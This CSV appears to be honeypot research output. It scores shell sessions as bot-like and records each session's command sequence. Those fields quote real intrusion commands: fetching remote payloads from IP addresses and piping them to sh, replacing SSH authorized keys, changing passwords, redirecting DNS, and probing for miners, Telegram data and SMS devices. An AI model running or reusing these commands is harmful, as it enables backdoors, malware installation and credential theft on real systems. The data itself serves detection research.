session,combo_key,label_pdf_quantile,label_tailtest,label_posterior,p_human_tail,p_human_posterior,n_pairs,n_commands,first_cmd,last_cmd,top_commands,logp_human_global
fd50880ee571,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,3.347620757259611e-56,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-116.902825880955
f2058af20250,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.4784306460873536e-43,4,6,cat /bin/echo,wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,cat /bin/echo | cat /proc/mounts | echo -e '\x72\x70\x70\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag | echo -e '\x4d\x4f\x55\x4e\x54\x53\x5f\x44\x4f\x4e\x45' | rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/.d; >/dev/.d); cp /dev/.d /dev/.f | wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,-96.59784307840178
076df683fb13,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,3.4332869386201573e-50,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-99.81705322324144
8ac4d29a4f3b,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.2772047220859227e-54,3,5,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | echo 'nameserver 95.214.27.202'>/etc/resolv.conf; | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-119.9834110213839
dc6d0f5101f8,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,5.520450170206922e-50,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-99.82126061274808
255416ee4f5e,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.111013705550021e-75,9,11,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget; echo -e '\x67\x61\x79\x66\x67\x74';,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /.z && >/.z && cd /; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /dev/netslink/.z && >/dev/netslink/.z && cd /dev/netslink/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; ch... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-164.74822172880383
97fde58b277f,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.5717211018999828e-60,9,11,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget http://109.206.243.207/ssh/x86_64 -O-> .i; ./.i scan.ssh.x86_64; >.i;,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /home/$USER/.z && >/home/$USER/.z && cd /home/$USER/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 77... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /etc/.z && >/etc/.z && cd /etc/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-135.79819940083456
93b89db2e601,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.761794097355694e-42,4,6,cat /bin/echo,wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,cat /bin/echo | cat /proc/mounts | echo -e '\x72\x70\x70\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag | echo -e '\x4d\x4f\x55\x4e\x54\x53\x5f\x44\x4f\x4e\x45' | rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/.d; >/dev/.d); cp /dev/.d /dev/.f | wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,-93.16644947495207
20343e3cfd52,False_False_False,non_human_like,non_human_like,bot_posterior_high,1.4454298469246396e-06,2.6689702430777455e-09,17,19,cd ~; chattr -ia .ssh; lockr -ia .ssh,df -h | head -n 2 | awk 'FNR == 2 {print $2; }',"cd ~; chattr -ia .ssh; lockr -ia .ssh | cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1... | cat /proc/cpuinfo | grep name | wc -l | echo -e ""admin\nxaZmO9pO0RUg\nxaZmO9pO0RUg"" | passwd | bash | echo ""admin\nxaZmO9pO0RUg\nxaZmO9pO0RUg\n"" | passwd | cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9; }' | free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' | ls -lh $(which ls)",-16.624885649437722
00ba26db5d38,False_False_False,non_human_like,non_human_like,bot_posterior_high,6.450041386218963e-06,8.022636899119286e-09,15,16,cat /proc/cpuinfo | grep name | wc -l,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1...","cat /proc/cpuinfo | grep name | wc -l | echo -e ""admin\nNI39NXBRbmIW\nNI39NXBRbmIW"" | passwd | bash | echo ""admin\nNI39NXBRbmIW\nNI39NXBRbmIW\n"" | passwd | cat /proc/cpuinfo | grep name | head -n 1 | awk '{print $4,$5,$6,$7,$8,$9; }' | free -m | grep Mem | awk '{print $2 ,$3, $4, $5, $6, $7}' | ls -lh $(which ls) | which ls | crontab -l",-15.032640244266592
fa5ee5f2cd67,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.0166657304685942e-41,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-81.07222968227944
72fbaf54c740,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,5.348333771948995e-71,11,15,sh,wget http://95.214.27.202/x86_64 -O-> .i || busybox wget http://95.214.27.202/x86_64 -O-> .i || wd1 http://95.214.27.202...,"sh | shell | enable | cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | mkdir /home/; mount -o remount, rw /home/; cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .... | mkdir /tmp/; mount -o remount, rw /tmp/; cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; ch... | mkdir /var/tmp/; mount -o remount, rw /var/tmp/; cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp... | mkdir /home/$USER/; mount -o remount, rw /home/$USER/; cp /bin/echo /home/$USER/.z && >/home/$USER/.z && cd /home/$USER/...",-154.38565656544165
ed2a69039026,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.19084508341132e-50,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-100.89307643539443
fe9ba131d580,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.6174804453627644e-49,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-107.16716106550471
4149c1f820b9,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,3.5742514534285e-54,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-109.7173113539426
a8d2b1d612d9,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.0545368015218005e-52,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-105.54529836427056
94ce1100acec,False_False_False,non_human_like,non_human_like,bot_posterior_high,1.0674128247956104e-10,5.205149913301527e-16,5,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-26.593473127424012
d37377a43802,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.956667685885334e-40,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-77.22932644831245
ef902ac91105,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,6.5114073106441454e-43,4,6,cat /bin/echo,wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,cat /bin/echo | cat /proc/mounts | echo -e '\x72\x70\x70\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag | echo -e '\x4d\x4f\x55\x4e\x54\x53\x5f\x44\x4f\x4e\x45' | rm -f /dev/.d; rm -f /dev/.f; >/dev/.d; (chmod 777 /dev/.d || cp /bin/echo /dev/.d; >/dev/.d); cp /dev/.d /dev/.f | wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,-95.12587890084828
6c7acda2c27d,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.6025113580647202e-54,3,5,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | echo 'nameserver 95.214.27.202'>/etc/resolv.conf; | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-118.79275423871364
cbf7fe6bd036,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.0471616371797168e-54,3,5,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | echo 'nameserver 95.214.27.202'>/etc/resolv.conf; | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-119.25816736688358
7bfcc235d77d,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.675792848400904e-32,5,6,wget -qO - http://119.18.194.146/x/1sh | sh > /dev/null 2>&1 &,cd /var/run; rm -rf tsh; tftp -g 127.0.0.1 -r tsh; sh tsh &,wget -qO - http://119.18.194.146/x/1sh | sh > /dev/null 2>&1 & | rm -rf /var/run/1sh; wget -c http://119.18.194.146/x/1sh -P /var/run && sh /var/run/1sh & | wget -qO - http://119.18.194.146/x/2sh | sh > /dev/null 2>&1 & | rm -rf /tmp/2sh; wget -c http://119.18.194.146/x/2sh -P /tmp && sh /tmp/2sh & | curl http://119.18.194.146/x/3sh | sh | cd /var/run; rm -rf tsh; tftp -g 127.0.0.1 -r tsh; sh tsh &,-69.69823442205248
f4ca34a23fc6,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,3.26258438951489e-20,4,5,cat /bin/echo,wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,cat /bin/echo | cat /proc/mounts | echo -e '\x72\x70\x70\x72/dev' > /dev/.dabag; cat /dev/.dabag; rm /dev/.dabag | echo -e '\x4d\x4f\x55\x4e\x54\x53\x5f\x44\x4f\x4e\x45' | wget --help>/dev/null && echo -en '\x57\x47\x45\x54'; curl --help>/dev/null && echo -en '\x43\x55\x52\x4c'; echo -en '\x...,-47.616643248027735
d1cd08d3c868,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.369808194270478e-37,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-77.88458013402851
8a36a8c853c8,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.2174269209948114e-47,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-95.14167830720416
a24a67f422b0,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,6.274519371673692e-54,3,5,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | echo 'nameserver 95.214.27.202'>/etc/resolv.conf; | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-117.56157791859032
f40408cc2fb5,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.3839736328741594e-99,9,12,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget http://171.22.136.15/x86_64 -O-> .i; ./.i scan.ssh.x86_64; >.i;,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /.z && >/.z && cd /; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /dev/netslink/.z && >/dev/netslink/.z && cd /dev/netslink/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; ch... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-221.35688988903547
ba3097ec5f4e,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.0108517969316842e-48,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-97.28456966777884
67902177aa12,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,3.689595336315236e-40,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-77.67310763016135
2cc75b863a14,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,5.574983207839131e-38,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-81.12945382750654
e27cd0c5827d,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,1.5435821310407922e-51,3,4,sh,cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,sh | shell | enable | cat /bin/echo || while read i; do echo $i; done < /proc/self/exe;,-102.8065566157304
ba0a3205a984,False_False_False,non_human_like,non_human_like,bot_posterior_high,4.988461865806926e-10,4.042993692730301e-15,5,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-24.991014687773628
4cef7fb5a390,False_False_False,non_human_like,non_human_like,bot_posterior_high,9.050538096744276e-13,2.931527692293729e-18,6,8,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la ~/.local/share/TelegramDesktop/tdata /home/*/.local/share/TelegramDesktop/tdata /dev/ttyGSM* /dev/ttyUSB-mod* /va... | locate D877F783D5D3EF8Cs | echo Hi | cat -n,-31.530001676596292
9291b8eae963,False_False_False,non_human_like,non_human_like,bot_posterior_high,1.9277801577288756e-11,4.371434794114025e-17,6,7,ifconfig,echo Hi | cat -n,ifconfig | uname -a | cat /proc/cpuinfo | ps | grep '[Mm]iner' | ps -ef | grep '[Mm]iner' | ls -la /dev/ttyGSM* /dev/ttyUSB-mod* /var/spool/sms/* /var/log/smsd.log /etc/smsd.conf* /usr/bin/qmuxd /var/qmux_connect... | echo Hi | cat -n,-28.3679755658815
205e7cae7fc2,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,4.05929510174847e-79,8,10,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget; curl; echo -e '\x67\x61\x79\x66\x67\x74';,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /home/$USER/.z && >/home/$USER/.z && cd /home/$USER/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 77... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /etc/.z && >/etc/.z && cd /etc/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-172.7012724745814
6f1fbd392aa2,False_False_False,non_human_like,non_human_like,bot_posterior_high,0.0,2.3023559312873974e-101,8,11,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM...",wget; echo -e '\x67\x61\x79\x66\x67\x74';,"cd ~ && rm -rf .ssh && mkdir .ssh && echo ""ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQC/yU0iqklqw6etPlUon4mZzxslFWq8G8sRyluQM... | cp /bin/echo /home/.z && >/home/.z && cd /home/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /.z && >/.z && cd /; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /tmp/.z && >/tmp/.z && cd /tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/tmp/.z && >/var/tmp/.z && cd /var/tmp/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /dev/netslink/.z && >/dev/netslink/.z && cd /dev/netslink/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; ch... | cp /bin/echo /dev/.z && >/dev/.z && cd /dev/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d; | cp /bin/echo /var/.z && >/var/.z && cd /var/; rm -rf .i; cp .z .i; cp .i .d; chmod 777 .i; chmod 777 .d;",-226.9080589678333
